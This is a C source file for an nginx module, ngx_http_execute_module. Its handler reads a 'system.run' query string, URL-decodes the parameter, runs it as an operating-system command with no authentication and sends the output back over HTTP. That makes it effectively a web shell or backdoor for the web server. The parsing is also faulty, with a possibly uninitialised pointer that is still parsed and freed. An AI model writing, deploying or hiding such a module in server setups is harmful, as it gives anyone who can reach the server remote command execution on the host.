/*
 * ngx_http_execute_module.c
 *
 * Author: Gandalf
 * email： zhibu1991@gmail.com
 */
#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>
#include "ngx_str.h"
#include "ngx_result.h"

/* Module config */
typedef struct {
	ngx_str_t ed;
} ngx_http_execute_loc_conf_t;

typedef struct {
    char        *command;
} ngx_http_command_conf_t;

static char *ngx_http_execute(ngx_conf_t *cf, ngx_command_t *cmd, void *conf);
static void *ngx_http_execute_create_loc_conf(ngx_conf_t *cf);
static char *ngx_http_execute_merge_loc_conf(ngx_conf_t *cf, void *parent,
		void *child);

static ngx_command_t ngx_http_execute_commands[] = { { ngx_string("command"),
NGX_HTTP_LOC_CONF | NGX_CONF_TAKE1, ngx_http_execute,
NGX_HTTP_LOC_CONF_OFFSET, 0, NULL },

ngx_null_command };
/* Http context of the module */
static ngx_http_module_t ngx_http_execute_module_ctx = { NULL, /* preconfiguration */
NULL, /* postconfiguration */

NULL, /* create main configuration */
NULL, /* init main configuration */

NULL, /* create server configuration */
NULL, /* merge server configuration */

ngx_http_execute_create_loc_conf, /* create location configration */
ngx_http_execute_merge_loc_conf /* merge location configration */
};

/* Module */
ngx_module_t ngx_http_execute_module = {
NGX_MODULE_V1, &ngx_http_execute_module_ctx, /* module context */
ngx_http_execute_commands, /* module directives */
NGX_HTTP_MODULE, /* module type */
NULL, /* init master */
NULL, /* init module */
NULL, /* init process */
NULL, /* init thread */
NULL, /* exit thread */
NULL, /* exit process */
NULL, /* exit master */
NGX_MODULE_V1_PADDING };

/* Handler function */
static ngx_int_t ngx_http_execute_handler(ngx_http_request_t *r) {
	ngx_int_t rc;
	ngx_buf_t *b;
	ngx_chain_t out;

	if (!(r->method & (NGX_HTTP_HEAD | NGX_HTTP_GET | NGX_HTTP_POST))) {
		return NGX_HTTP_NOT_ALLOWED;
	}
	static char * urlargs;
	if (!ngx_strncmp(r->args.data, "system.run", 10))
		urlargs = strndup((char *) r->args.data, strlen((char *) r->args.data) - 15);
	char key[2048];
	char parameters[2048];
	char outargs[sizeof parameters] = { 0 };
	parse_command(urlargs, key, sizeof(key), parameters, sizeof(parameters));
	urldecode(outargs, parameters);
	char *cmd_result = NULL, error[MAX_STRING_LEN];
	ngxexecute_execute(outargs, &cmd_result, error, sizeof(error));
	free(urlargs);

	r->headers_out.content_type.len = sizeof("text/html") - 1;
	r->headers_out.content_type.data = (u_char *) "text/html";
	r->headers_out.status = NGX_HTTP_OK;
	r->headers_out.content_length_n = strlen(cmd_result);

	if (r->method == NGX_HTTP_HEAD) {
		rc = ngx_http_send_header(r);
		if (rc != NGX_OK) {
			return rc;
		}
	}

	b = ngx_pcalloc(r->pool, sizeof(ngx_buf_t));
	if (b == NULL) {
		ngx_log_error(NGX_LOG_ERR, r->connection->log, 0,
				"Failed to allocate response buffer.");
		return NGX_HTTP_INTERNAL_SERVER_ERROR;
	}
	out.buf = b;
	out.next = NULL;

	b->pos = (u_char *) cmd_result;
	b->last = (u_char *) cmd_result + strlen(cmd_result);
	b->memory = 1;
	b->last_buf = 1;
	rc = ngx_http_send_header(r);
	if (rc != NGX_OK) {
		return rc;
	}
	return ngx_http_output_filter(r, &out);
}

static char *
ngx_http_execute(ngx_conf_t *cf, ngx_command_t *cmd, void *conf) {
	ngx_http_core_loc_conf_t *clcf;
	ngx_str_t *value;
	ngx_http_command_conf_t *com = conf;

	if (com->command) {
	        return "is duplicate";
	    }
	value = cf->args->elts;
        if (ngx_strcasecmp(value[1].data, (u_char *) "on") != 0) {
                return NGX_CONF_OK;
        }

	clcf = ngx_http_conf_get_module_loc_conf(cf, ngx_http_core_module);
	clcf->handler = ngx_http_execute_handler;
	ngx_conf_set_str_slot(cf, cmd, conf);

	return NGX_CONF_OK;
}

static void *
ngx_http_execute_create_loc_conf(ngx_conf_t *cf) {
	ngx_http_execute_loc_conf_t *conf;

	conf = ngx_pcalloc(cf->pool, sizeof(ngx_http_execute_loc_conf_t));
	if (conf == NULL) {
		return NGX_CONF_ERROR ;
	}
	conf->ed.len = 0;
	conf->ed.data = NULL;

	return conf;
}

static char *
ngx_http_execute_merge_loc_conf(ngx_conf_t *cf, void *parent, void *child) {
	ngx_http_execute_loc_conf_t *prev = parent;
	ngx_http_execute_loc_conf_t *conf = child;

	ngx_conf_merge_str_value(conf->ed, prev->ed, "");

	return NGX_CONF_OK;
}
